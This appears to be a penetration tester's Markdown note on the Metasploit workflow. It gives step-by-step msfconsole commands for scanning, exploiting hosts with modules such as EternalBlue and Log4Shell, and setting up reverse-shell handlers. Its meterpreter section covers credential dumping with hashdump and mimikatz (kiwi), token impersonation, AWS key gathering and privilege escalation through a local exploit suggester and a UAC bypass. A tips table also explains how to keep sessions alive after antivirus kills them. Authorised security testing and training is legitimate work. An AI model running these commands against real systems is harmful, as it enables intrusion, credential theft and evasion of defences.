---
tags: [pentest, metasploit, msf, exploitation, initial-access]
tool: metasploit
phase: 5
---
# Metasploit Framework - Workflow

The canonical exploit framework. Use it for proven public exploits, payload generation ([[09 - msfvenom Payload Cookbook]]), and post-modules.

[[06 - Gaining Access/00 - README|Folder index]]

## Setup (do once per engagement)

```bash
sudo systemctl start postgresql
sudo msfdb init
msfconsole -q

# In msfconsole
msf6> db_status              # should say "Connected to msf"
msf6> workspace -a ACME      # create per-engagement workspace
msf6> workspace ACME
```

## Standard flow: scan → analyze → exploit

```text
msf6> db_nmap -sC -sV -p- -Pn 10.0.0.5
db_import Target.xml
msf6> hosts
msf6> services
msf6> vulns
msf6> analyze                       # suggests modules per host (Pro feature in some installs)
msf6> search ms17-010
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> show options
msf6> set RHOSTS 10.0.0.5
msf6> set LHOST tun0                # NIC alias works
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> check                         # is the target vulnerable?
msf6> run -j                        # background
msf6> sessions
msf6> sessions -i 1
```

## Useful console commands

```text
search type:exploit platform:windows name:tomcat
search cve:2021-44228
info exploit/...                # description, options, refs
use <full-path-or-search-id>
back
options                         # equivalent to show options
setg LHOST tun0                 # global - set across all modules
unsetg LHOST
save                            # persist current options to ~/.msf4/config

# Sessions
sessions                        # list active
sessions -i 2                   # interact with session 2
sessions -k 3                   # kill session 3
sessions -K                     # kill all
sessions -u 1                   # upgrade shell to meterpreter

# Routing / pivot
route add 10.0.1.0/24 1         # route via session 1
route                           # show routes

# Background module / session
^Z                              # background (Ctrl+Z)
jobs                            # list
jobs -K                         # kill all background jobs
```

## Inside meterpreter

```text
sysinfo
getuid
getsystem                       # try local privesc tokens / named pipe trick
hashdump                        # dump SAM (needs SYSTEM)
load kiwi; creds_all            # mimikatz in-memory
load incognito; list_tokens -u  # token impersonation
shell                           # drop to cmd.exe
download / upload <file>
edit <file>
run post/windows/gather/enum_logged_on_users
```

## Useful module categories

```text
# Discovery / scanning
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/ssh/ssh_login

# Exploits
use exploit/multi/handler                  # generic listener
use exploit/windows/smb/psexec
use exploit/windows/smb/ms17_010_eternalblue
use exploit/multi/http/log4shell_header_injection
use exploit/multi/script/web_delivery      # serve a payload via web

# Post (after sessions exist)
**use post/multi/recon/local_exploit_suggester**
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector
use post/linux/gather/hashdump
use post/multi/gather/aws_keys
```

## "I know my own LHOST is right" sanity check

```bash
# msf6 outside the console
msf-route_simulator                  # rarely needed
ip a | grep tun0                     # what's the IP it'll connect back to?
```

In console:

```text
setg LHOST tun0
setg LPORT 4444
```

## Generic reverse-shell handler

```text
msf6> use exploit/multi/handler
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST tun0
msf6> set LPORT 4444
msf6> set ExitOnSession false
msf6> run -j
```

Now ANY payload you generate ([[09 - msfvenom Payload Cookbook]]) with matching LHOST/LPORT will land on this handler.

## Resource scripts (automate startup)

```bash
cat > ~/handler.rc <<'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
set ExitOnSession false
run -j
EOF
msfconsole -q -r ~/handler.rc
```

## Running Local Exploit Suggester

After getting a Meterpreter session, do this before anything else.

```text
# Step 1 — check arch and migrate to a 64-bit process
meterpreter > sysinfo                        # confirm OS and arch
meterpreter > ps                             # find a stable 64-bit process (explorer.exe, svchost.exe)
meterpreter > migrate <PID>                  # IMPORTANT: x86 Meterpreter on x64 OS = false negatives
meterpreter > background                     # Ctrl+Z to send session to background

# Step 2 — run the suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1                         # replace 1 with your actual session number
msf6 > run
# Takes 2-5 min. Checks ~250 exploits. Does NOT run them — suggestions only.

# Output example:
# [+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target appears to be vulnerable.
# [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.

# Step 3 — try each suggestion
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 > set SESSION 1
msf6 > set LHOST tun0
msf6 > run
```

> [!note] `getsystem` vs `local_exploit_suggester`
> `getsystem` tries a few privesc tricks automatically right now. `local_exploit_suggester` maps your full attack surface first. Run the suggester to understand options, then `getsystem` as the quick-win attempt.

See [[15.5 - MSF Local Exploit Suggester]] for the full module reference.

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `Exploit completed, but no session was created` | Wrong payload arch (x86 vs x64), or wrong handler. Check `set ARCH`, `set PAYLOAD`. |
| `Handler failed to bind to ...` | LPORT in use. `ss -tlnp \| grep <port>`. Use a different port. |
| `Could not connect to PostgreSQL` | `sudo systemctl restart postgresql; msfdb reinit` |
| `check` returns "appears vulnerable" but `run` fails | Try a different payload (`set PAYLOAD windows/shell_reverse_tcp` for cleaner debug). |
| Session dies in seconds | Likely AV killed it. Use `migrate` immediately to a long-lived PID: `meterpreter > migrate <pid>` |
| `target unreachable` over pivot | `route print` (in msf) → does the route exist? Try `setg ReverseListenerComm 1` to send the reverse callback over the pivot. |
| Local exploit suggester returns nothing | Likely running x86 on x64 OS. `migrate` to a 64-bit process (explorer.exe) and re-run. Also try `getsystem` separately. |

> [!tip] One thing pros do
> Always run `use post/multi/recon/local_exploit_suggester` against a session right after you get it. It saves you 20 minutes of manual enumeration.

## See also

- [[09 - msfvenom Payload Cookbook]]
- [[10 - Searchsploit to Working Exploit]]
- [[29 - Mimikatz Deep Dive]] (use kiwi inside meterpreter)
